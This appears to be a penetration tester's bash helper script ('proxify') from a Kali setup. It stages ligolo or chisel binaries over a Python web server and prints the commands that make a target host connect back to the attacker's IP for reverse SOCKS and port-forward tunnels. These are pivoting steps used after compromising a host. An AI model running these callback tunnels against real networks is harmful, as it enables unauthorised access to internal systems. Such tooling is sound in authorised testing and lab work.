#!/bin/bash

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
NC=$(tput sgr0)
bold=$(tput bold)
ul=$(tput smul)
PURPLE=$(tput setaf 5)

platform=$1
method=$2
if [[ -z "$platform" || -z "$method" || "$platform" = "-h" ]]; then
    printf "${RED}Usage: ${NC}proxify platform method\n"
    printf "\n        platform - w for windows or l for linux\n"
    printf "\n        method   - c for chisel or l for ligolo\n"
    printf "\nExamples:\n"
    printf "        ${GREEN}proxify.sh l c${NC}  # for Linux chisel proxy\n"
    printf "        ${GREEN}proxify.sh w l${NC}  # for Windows ligolo proxy\n"
    exit 1
fi

if [ -n "$(ifconfig tun0)" ]; then
    ip=$(ifconfig tun0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
elif [ -n "$(ifconfig eth0)" ]; then
    ip=$(ifconfig eth0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
elif [ -n "$(ifconfig eth0)" ]; then
    ip=$(ifconfig wlan0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
else
    echo "${RED}Error: Unable to retrieve IP address.${NC}"
    echo "Enter IP address:"
    read -r ip
fi
ligolo_method(){
    printf "\n${RED}======================================Ligolo======================================${NC}\n"
	printf "\n${YELLOW}${ul}${bold}Kali:${NC}"
	printf "\n${PURPLE}sudo ip tuntap add user kali mode tun ligolo"
	printf "\nsudo ip link set ligolo up"
    printf "\ncd ligolo"
	printf "\n~/Documents/Common/ligolo/proxy -selfcert"
	printf "\nsudo ip route add ip dev ligolo\n"
    printf "${GREEN}${ul}${bold}Port Forward:${NC}${PURPLE} listener_add --addr 0.0.0.0:from_port --to 0.0.0.0:our_port\n${NC}"
	printf "\n${YELLOW}${ul}${bold}Target:\n${NC}"
	if [[ "$platform" = "l" ]]; then
        printf "${PURPLE}chmod +x agent\n"
		printf "${PURPLE}./agent -connect $ip:11601 -ignore-cert -retry${NC}"
	else
		printf "${PURPLE}.\\\agent.exe -connect $ip:11601 -ignore-cert -retry${NC}"
	fi
}
chisel_method(){
	printf "\n${RED}======================================Chisel======================================${NC}\n"
	printf "\n${YELLOW}${ul}${bold}Kali:${NC}"
	printf "\n${PURPLE}chisel server --reverse --socks5 -p 8001"
	printf "\n${YELLOW}${ul}${bold}Target:\n${NC}"
	if [[ "$platform" = "l" ]]; then
		printf "${PURPLE}./chisel client $ip:8001 R:socks${NC}"
        printf "\n${GREEN}${ul}${bold}Single Port:${NC} ${PURPLE}./chisel client $ip:8001 R:port:127.0.0.1:port\n"
	else
		printf "${PURPLE}.\\\chisel.exe client $ip:8001 R:socks${NC}"
        printf "\n${GREEN}${ul}${bold}Single Port:${NC} ${PURPLE}.\chisel.exe client $ip:8001 R:port:127.0.0.1:port\n"
	fi
}
if [ "$method" = "l" ]; then
	if ss -tuln | grep ':80 ' >/dev/null 2>&1; then
        printf "\nPort 80 is in use, using port 8080 instead.\n"
        if [ "$platform" = "l" ]; then
        	Transfile.sh agent l 8080
        else
        	Transfile.sh agent.exe w
        fi
        ligolo_method
		printf "${GREEN}\n"
        python3 -m http.server 8080 -d /home/kali/Documents/Common/ligolo/
    else
        if [ "$platform" = "l" ]; then
        	Transfile.sh agent l
        else
        	Transfile.sh agent.exe w
        fi
        ligolo_method
		printf "${GREEN}\n"
        python3 -m http.server 80 -d /home/kali/Documents/Common/ligolo/
    fi 
fi
if [ "$method" = "c" ]; then
	if ss -tuln | grep ':80 ' >/dev/null 2>&1; then
        printf "\nPort 80 is in use, using port 8080 instead.\n"
        if [ "$platform" = "l" ]; then
        	Transfile.sh chisel l 8080
        else
        	Transfile.sh chisel.exe w 8080
        fi
        chisel_method
		printf "${GREEN}\n"
        python3 -m http.server 8080 -d /home/kali/Documents/Common/chisel/

    else
        if [ "$platform" = "l" ]; then
        	Transfile.sh chisel l
        else
        	Transfile.sh chisel.exe w
        fi
        chisel_method
		printf "${GREEN}\n"
        python3 -m http.server 80 -d /home/kali/Documents/Common/chisel/
    fi
fi

